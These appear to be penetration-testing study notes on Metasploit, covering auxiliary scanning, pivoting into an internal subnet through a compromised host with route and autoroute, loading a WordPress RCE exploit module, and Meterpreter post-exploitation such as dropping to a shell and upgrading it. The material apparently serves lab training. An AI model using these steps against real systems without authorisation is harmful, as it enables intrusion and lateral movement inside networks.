## <u>Auxiliary Modules (الوحدات المساعدة)</u>

- Gather info — **no payloads/exploits**.
- Used for scanning, enumeration, and discovery.

### Example Workflow

1. Use auxiliary module to scan first target → find open ports.  
2. Exploit service → gain foothold.  
3. Pivot to internal subnet.  
4. Use auxiliary module again to scan second target.

## <u>More Explication :</u>
### Scanning a Second Target: From Kali or From Foothold?

### ✅ Correct Interpretation:
>**"Scan a second target on the same internal network *from our first compromised host*"**
>→ This is **pivoting**: using your initial foothold as a proxy to reach other internal systems
>**inaccessible from Kali**.

### <u>Why Not Scan Directly from Kali?</u>

- The second target may be on a **different subnet** (e.g., `192.168.2.0/24`) with **no direct route** from your Kali machine (`192.168.1.0/24`).
- Firewalls may **block external access**, but allow traffic **from inside the network**.
### <u>How It Works</u>

1. Compromise **Target 1** (e.g., `192.168.1.10`) → get a shell.
2. In Metasploit, add a **route** through the session:
```msf
route add 192.168.2.0 255.255.255.0 <SESSION_ID>
```

3. Now run auxiliary scanners **from Kali**, but traffic flows **through Target 1**:
```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.20
run
```

> 🔁 You’re **not scanning from the target itself** — you’re **proxying through it** using Metasploit’s routing.

## <u>More in depth steps :</u>

You **run Metasploit from your Kali machine** (`192.168.1.1`) — **not** on the compromised host.

### Here’s how it works in your scenario:

- **Kali**: `192.168.1.1` → runs `msfconsole`
- **Target 1 (compromised)**: `192.168.99.10` → you have a <u>Meterpreter or shell session</u>
- **Target 2 (internal)**: `192.168.99.2` → not reachable from Kali directly

### Steps:

1. **Exploit Target 1 from Kali** → get a session (e.g., session `1`).
2. In `msfconsole` (on **Kali**), add a route:
```msf
   route add 192.168.99.0 255.255.255.0 1
```

   → This tells Metasploit: *"Send traffic for 192.168.99.0/24 through session 1."*
   
3. Still in `msfconsole` (**on Kali**), run an auxiliary scanner:
```msf
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 192.168.99.2
   run
```

### What Happens Under the Hood:

- Metasploit (on Kali) **sends scan commands** to the payload on **Target 1**.
- The payload on Target 1 **executes the scan locally** against `192.168.99.2`.
- Results are **sent back to Kali** and stored in the database.

> ✅ **You never log into Target 1 manually** or run `msfconsole` there.  
> ✅ All interaction happens **from Kali**, using the compromised host as a **transparent proxy**.

This is <u>pivoting</u> **via Metasploit’s routing layer** — a core red team technique.

### <u>Question</u> : But what happens if pc1 cannot execute the payloads, perhaps because nmap is not installed on it?

**Metasploit does NOT require `nmap` (or any external tool) on the compromised host.**  
It uses **pure-Ruby TCP socket scanners** built into its **auxiliary modules**, which run **entirely in-memory** via the payload (e.g., Meterpreter).
### 🔍 How It Really Works
#### When you run:
```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.99.2
run
```

- Metasploit **sends Ruby code** through your existing session (e.g., Meterpreter) to **Target 1**.
- That Ruby code **opens raw TCP sockets** directly from Target 1 → to `192.168.99.2`.
- It **does not call `nmap`**, `nc`, or any system binary.
- Results are sent back to Kali over the same session.

---
---
# <u>Metasploit Workflow Cheat Sheet</u>

## 🗂️ Workspace Management
```msf
workspace -a testing    # Create new workspace
workspace testing       # Switch to it
```

## 📥 Import Scan Data
```msf
db_import /home/kali/ubuntu_nmap.xml
```

## 🔍 Verify Imported Data
```msf
hosts        # List discovered hosts
services     # Show open ports & services per host
vulns        # Display identified vulnerabilities
```

## 🔄 Run Internal Nmap (Auto-saves to DB)
```msf
db_nmap -Pn -A 192.168.125.19
```

> 💡 No need for `-oX` — results auto-save to current workspace.

---

## 🔎 Module Discovery & Usage
### Find Modules
```msf
search wordpress
search type:auxiliary portscan
```

### Load a Module
```msf
use exploit/multi/http/wp_bricks_builder_rce
# OR use index from search: use 3
```

### View Module Info
```msf
info          # Full module details
options  # Required/optional settings (same as `show options`)
```

### Configure & Run
```msf
set RHOSTS 192.168.125.19
set LHOST 192.168.125.18
exploit       # or `run` (identical in most cases)
```

---
---
## 🖥️ Post-Exploitation (Meterpreter)

### Basic Recon
```msf
sysinfo               # OS, arch, user info

shell                 # Drop to system shell
# Then, depending on OS:
#   Linux:  /bin/bash -i    (to get interactive shell)
#   Windows: whoami         (to confirm current user)
```

>- **On Windows targets**:  
    → `shell` in Meterpreter **already gives you a Windows command prompt (`cmd.exe`)**.  
    → **No need** to run anything like `cmd.exe` or `powershell.exe` manually — you’re already in a CLI.
>- **On Linux targets**:  
    → `shell` gives you `/bin/sh`, which is often **non-interactive** (no history, no tab-completion).  
    → So you **upgrade** it with: `/bin/bash -i`
    
### Pivoting Setup
1. Get **internal IP** of compromised host (`ip a` or `ipconfig`)
2. Still in Meterpreter add route through session:
   ```msf
   run autoroute -s 192.168.99.0/24 #Or just the target IP Address
   ```
   
>Routes all traffic for `192.168.99.0/24` through this session.

3. Background session:
   ```msf
   background #To put meterpreter session in background
   ```

```msf
sessions              # List active sessions
sessions -i <ID>        # Interact with a specific session (e.g., sessions -i 1)
```
### Pivot Scanning
```msf
search portscan       # Find scanner modules
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.99.20
run
```

### Clean Up
```msf
back                  # Exit current module
unset all             # Clear all settings (optional)
```

---
---
